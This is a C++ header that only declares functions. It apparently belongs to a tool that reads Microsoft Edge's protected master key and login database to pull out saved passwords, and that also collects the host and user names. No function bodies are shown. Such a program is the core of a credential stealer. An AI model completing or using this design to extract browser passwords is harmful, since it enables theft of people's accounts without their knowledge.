#pragma once
#include <nlohmann/json.hpp>

using json = nlohmann::json;

std::string GetAppDataPath();
std::string GetWinVersion();
std::string uprotectkey(const std::string& key);
std::string masterkey(const std::string& path);
json EdgePasswords();
std::string GetDBContent(const std::string& db_path);
std::string GetHostName();
std::string GetUName();
